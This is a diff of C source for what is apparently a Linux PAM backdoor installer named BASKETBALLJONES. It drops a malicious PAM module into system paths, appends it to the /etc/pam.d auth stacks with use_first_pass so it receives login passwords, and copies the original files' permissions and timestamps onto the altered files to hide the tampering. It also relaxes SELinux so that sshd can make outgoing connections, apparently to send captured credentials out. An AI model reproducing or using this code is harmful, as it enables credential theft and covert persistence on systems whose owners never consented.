@@ -32,15 +32,16 @@ typedef enum
 static const char c_mod_name[128] = "BASKETBALLJONES";
 
 //
-// guess reasonable mtime timestamp for a file (uses closest matching filename)
+// return the struct stat for the closest matching filename in a directory
 //
-time_t best_mtime(const char *filepath)
+int best_stat_match(const char *filepath, struct stat* best)
 {
-    time_t best_time = 0;
+    int retval = -1;
+    
     char *dirname = strdup(filepath);
     char *basename = NULL;
     
-    if (NULL != dirname)
+    if (NULL != dirname && NULL != best)
     {
         struct dirent **names = NULL;
         int num_names = 0;
@@ -73,14 +74,14 @@ time_t best_mtime(const char *filepath)
                 if (curr > most_matched)
                 {
                     char fullpath[258] = {0};
-                    struct stat sb = {0};
 
                     snprintf(fullpath, sizeof(fullpath), "%s/%s", dirname, curr_name);
-                    if (0 == stat(fullpath, &sb))
+                    if (0 == stat(fullpath, best))
                     {
                         DEBUG_LOG("    best match so far: %s\n", fullpath);
                         most_matched = curr;
-                        best_time = sb.st_mtime;
+
+                        retval = 0;  // got at least one match
                     }
                 }
                 // assume alphabetical order means best match should increase to a global max
@@ -94,7 +95,7 @@ time_t best_mtime(const char *filepath)
         free(dirname);
     }
 
-    return best_time;
+    return retval;
 }
 
 //
@@ -107,6 +108,7 @@ int drop_pam_mod(distro_t distro)
     if (distro)
     {
         char mod_path[128] = {0};
+        struct stat best_stat = {0};
 
         switch(distro)
         {
@@ -123,28 +125,28 @@ int drop_pam_mod(distro_t distro)
             break;
         }
 
-        time_t best_timestamp = best_mtime(mod_path);
-        if (0 != best_timestamp)
+        if (0 == best_stat_match(mod_path, &best_stat))
         {
             FILE *pam_mod = fopen(mod_path, "w");
             if (NULL != pam_mod)
             {
-                struct utimbuf times = {best_timestamp, best_timestamp};
                 size_t written = fwrite((void *)c_PamModule, sizeof(char), sizeof(c_PamModule), pam_mod);
                 fclose(pam_mod);
 
                 if (written == sizeof(c_PamModule))
                 {
-                    // TODO: proper file permissions seem to vary by distro?
-                    if (0 == chmod(mod_path, (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)))
-                    {
-                        DEBUG_LOG("Dropped pam module : %s\n", mod_path);
+                    struct utimbuf times = {best_stat.st_atime, best_stat.st_mtime};
+                    unsigned int mode = best_stat.st_mode & 0007777;
+                
+                    DEBUG_LOG("Dropped pam module : %s\n", mod_path);
 
-                        retval = 0;  // install has been successful - timestamp fix is optional
-                    }
-                    if (0 == utime(mod_path, &times))
+                    if ((0 == chmod(mod_path, mode)) &&
+                        (0 == utime(mod_path, &times)))
                     {
-                        DEBUG_LOG("Set timestamps for %s\n", mod_path);
+                        DEBUG_LOG("  mode:  %o\n  atime: %s  mtime: %s", mode,
+                            asctime(localtime(&best_stat.st_atime)), asctime(localtime(&best_stat.st_mtime)));
+                        
+                        retval = 0;
                     }
                 }
             }
@@ -172,38 +174,37 @@ int config_auth_stack(distro_t distro)
             conf_path = "/etc/pam.d/common-auth";
             break;
         case RHEL:
-            conf_path = "/etc/pam.d/password-auth";
+            conf_path = "/etc/pam.d/postlogin";
             break;
         case SUSE:
-            conf_path = "TODO";
+            conf_path = "/etc/pam.d/postlogin-auth-pc";  // TODO: test and verify
             break;
         default:
             break;
         }
 
-        time_t timestamp = best_mtime(conf_path);
-        if (timestamp)
+        struct stat stack_stat = {0};
+        if (0 == stat(conf_path, &stack_stat))
         {
             FILE *pam_conf = fopen(conf_path, "a");
             if (pam_conf)
             {
                 char entry[128] = {0};
-                struct utimbuf times = {timestamp, timestamp};
+                struct utimbuf times = {stack_stat.st_atime, stack_stat.st_mtime};
 
-                // TODO: figure out where to insert the modules in each stack
                 int written =
-                        fprintf(pam_conf, "\nauth    optional                        %s.so use_first_pass", c_mod_name);
+                        fprintf(pam_conf, "\nauth    optional    %s.so use_first_pass", c_mod_name);
                 fclose(pam_conf);
 
                 if (written > 0)
                 {
                     DEBUG_LOG("Added %s.so to %s\n", c_mod_name, conf_path);
-                    
-                    retval = 0;  // install has been successful - timestamp fix is optional
 
                     if (0 == utime(conf_path, &times))
                     {
                         DEBUG_LOG("Set timestamps for %s\n", conf_path);
+
+                        retval = 0;
                     }
                 }
             }
@@ -248,7 +249,17 @@ int main()
             if (0 == config_auth_stack(distro))
             {
                 DEBUG_LOG("PAM mod installed!\n");
-                retval = 0;
+
+                // selinux blocks outgoing HTTPS connections from sshd
+                if (DEBIAN == distro)
+                {
+                    retval = 0;
+                }
+                else if (0 == system("setsebool -P nis_enabled 1"))
+                {
+                    DEBUG_LOG("selinux policy nis_enabled = 1\n");
+                    retval = 0;
+                }
             }
         }
     }
